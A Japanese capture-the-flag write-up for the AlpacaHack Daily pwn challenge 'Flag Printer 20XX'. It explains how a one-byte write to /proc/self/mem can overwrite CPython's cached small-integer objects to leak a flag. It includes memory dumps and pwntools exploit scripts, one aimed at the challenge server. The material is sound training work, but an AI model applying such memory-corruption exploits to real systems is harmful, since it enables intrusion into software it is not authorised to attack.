---
title: "Flag Printer 20XX - AlpacaHack Daily"
category: "pwn"
subcategory: "pwn"
type: "writeup"
tags: ["pwn", "alpacahack", "printer", "binary-exploitation", "flag-printer-20xx", "alpacahack-daily"]
summary: "Flag Printer 2026 - timeout + arbitrary 1-byte write"
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202606/d19_Flag_Printer_20XX/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Flag Printer 20XX"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Flag Printer 20XX
- **Date:** 2026-06-19
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202606/d19_Flag_Printer_20XX>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202606/d19_Flag_Printer_20XX/README.md>

---
# Flag Printer 20XX

## 問題

Flag Printer 2026 - timeout + arbitrary 1-byte write

```py
flag = "Alpaca{????}"
assert len(flag) == 12

# arbitrary 1-byte write to memory :)
print(f"Hint: {id(0) = }")
mem = open("/proc/self/mem", "wb", buffering=0)
mem.seek(int(input("Offset: ")))
mem.write(bytes.fromhex(input("1-byte (Hex): "))[:1])

for i in range(len("Alpaca{")):
    print(flag[i], end="", flush=True)
```

## 概要

flagを1文字ずつ出力しますが、`len("Alpaca{")`の分、7文字分しか出力してくれません。

その前に、ヒントとして`id(0)`が与えられた後、メモリ上の1バイトを書き換えることができるようですが、どのように書き換えればいいのでしょうか？

## 解法

Pythonでは、C言語やJava等と違って、整数も小数も文字列も全てオブジェクトとして扱われます。

ヒントの`id(0)`は、`0`という整数オブジェクトがどこに配置されているかを表すメモリ上の番地のようです。

小さい整数のオブジェクトは32バイトずつ連続して配置されるようなので、試しに`id(x)`の値とその場所から32バイト分をそれぞれ確認してみました。

```py
mem = open("/proc/self/mem", "rb", buffering=0)
for x in range(16):
    mem.seek(id(x));print(f"{hex(id(x))}: {mem.read(32).hex()}")
```
```
0x72bf8f553550: 000000c000000500004b528fbf72000005000000000000000000000000000000
0x72bf8f553570: 000000c000000500004b528fbf7200000c000000000000000100000000000000
0x72bf8f553590: 000000c000000500004b528fbf7200000c000000000000000200000000000000
0x72bf8f5535b0: 000000c000000500004b528fbf7200000c000000000000000300000000000000
0x72bf8f5535d0: 000000c000000500004b528fbf7200000c000000000000000400000000000000
0x72bf8f5535f0: 000000c000000500004b528fbf7200000c000000000000000500000000000000
0x72bf8f553610: 000000c000000500004b528fbf7200000c000000000000000600000000000000
0x72bf8f553630: 000000c000000500004b528fbf7200000c000000000000000700000000000000
0x72bf8f553650: 000000c000000500004b528fbf7200000c000000000000000800000000000000
0x72bf8f553670: 000000c000000500004b528fbf7200000c000000000000000900000000000000
0x72bf8f553690: 000000c000000500004b528fbf7200000c000000000000000a00000000000000
0x72bf8f5536b0: 000000c000000500004b528fbf7200000c000000000000000b00000000000000
0x72bf8f5536d0: 000000c000000500004b528fbf7200000c000000000000000c00000000000000
0x72bf8f5536f0: 000000c000000500004b528fbf7200000c000000000000000d00000000000000
0x72bf8f553710: 000000c000000500004b528fbf7200000c000000000000000e00000000000000
0x72bf8f553730: 000000c000000500004b528fbf7200000c000000000000000f00000000000000
```

この結果から、`x`という整数オブジェクトが参照する実体は`id(x) + 24`、すなわち`id(0) + x * 32 + 24`の場所に配置されることがわかりました。

`len("Alpaca{")`は`7`なので、試しに`7`を`5`に書き換えてみることにします。

こうすると、この世界のルールが書き換わって、`7`という整数は全て`5`として扱われるようになるはずです。

具体的には、`7`の実体がある番地は`id(0) + 248`なので、ヒントとして得た`id(0)`に248を足した番地に16進数の`05`を書き込みます。

```py
import pwn

HOST, PORT = "localhost", 1337
x, y = 7, 5

p = pwn.remote(HOST, PORT)
d = p.recvuntil(b": ")
hint = int(d.decode().split()[3])
offset = hint + (x * 32) + 24
p.sendline(str(offset).encode())
p.sendlineafter(b": ", f"{y:02x}".encode())
flag = p.recvall().decode()
print(f"{flag = }")
```
```
flag = 'Alpac'
```

出力が7文字から5文字に変わっています。良い感じです。

しかしここで問題が発生しました。

12文字出力したいので、7→12に書き換えてみると、`Alpaca{`を出力した時点でエラーになってしまうようです。
```
challenge-1  | 2026/06/xx xx:xx:xx socat[xx] W waitpid(): child xx exited on signal 11
```

わかりやすくするためにフラグを`Alpaca{BCDE}`に変えて他の書き換えも試してみると、
```
7→8  のとき ⇒ Alpaca{C
7→9  のとき ⇒ Alpaca{DC
7→10 のとき ⇒ Alpaca{ECD
7→11 のとき ⇒ Alpaca{}CDE
```

なるほど、わかりました！

さきほど、「世界のルールが変わる」というお話をしました。

例えば`7→9`の場合、`i`が0,1,2,...と順に回る途中で`i`が`7`になったときに`flag[9]`を出力してしまっていたようですね。

これなら`flag[12]`を出力しようとしてエラーになっていたのも納得です。

しかしこれは困りましたね。

`7→11`の結果から、2～4文字目は特定できますが、1文字目がわかりません。

`7`以下だと`7`まで回らないので`flag[7]`は出力できないし、`7`より大きいとその場所の文字が出てしまうのでやはり`flag[7]`は出力できないからです。

フラグの未知部分は1文字分だけなので、最悪`!`から`~`まで94通り全て提出するBrute force解答しても良さそうですが、ルールとかマナーとかモラルとか諸々に違反してしまうような気がしたのでやめました。

しばらく考えて、突然ひらめきました。

ループの途中を差し替えることができるのであれば、全く関係ない4とかを7に書き換えてあげれば、その部分に`flag[7]`が出力されるのではないでしょうか？

```
4→7  のとき ⇒ AlpaBa{
```

きました！ちゃんと`flag[4]`が出力されるはずの5文字目が`flag[7]`の`B`になっています。

よって、`7→11`と`4→7`の2回に分けて得た情報から、フラグを組み立てることができることがわかりました。

```py
import pwn

#HOST, PORT = "localhost", 1337
HOST, PORT = "34.170.146.252", 19629

def get_flag(x:int, y:int)->str:
    p = pwn.remote(HOST, PORT)
    d = p.recvuntil(b": ")
    hint = int(d.decode().split()[3])
    offset = hint + (x * 32) + 24
    p.sendline(str(offset).encode())
    p.sendlineafter(b": ", f"{y:02x}".encode())
    flag = p.recvall().decode()
    return flag

flag1 = get_flag(7, 11)
flag2 = get_flag(4, 7)
flag = flag1[:7] + flag2[4] + flag1[8:] + flag1[7]
print(f"{flag = }")
```
